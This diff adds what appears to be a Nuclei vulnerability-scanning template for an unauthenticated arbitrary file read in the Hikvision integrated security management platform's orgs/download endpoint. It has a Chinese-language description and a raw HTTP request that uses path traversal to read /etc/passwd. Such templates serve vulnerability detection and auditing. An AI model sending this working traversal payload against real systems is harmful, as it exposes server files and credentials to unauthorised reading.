@@ -1,0 +1,26 @@
+id: hikvision-download-File-reading
+
+info:
+  tags: hikvision-download-File-reading
+  name: 海康威视综合安防管理平台 orgManagev1orgsdownload 任意文件读取漏洞
+  author: xc
+  severity: high
+  description: 海康威视综合安防管理平台/orgManage/v1/orgs/download 接口处存在任意 文件读取漏洞，未经身份验证的远程攻击者可利用目录遍历的方式绕过权限认证直接读取后台服务器配置文件等敏感文件，造成信息泄露，使系统处于极不安全的状态。
+
+http:
+  - raw:
+      - |
+        GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
+          - '/bin/bash'
+        condition: and
+      - type: status
+        status: 
+          - 200
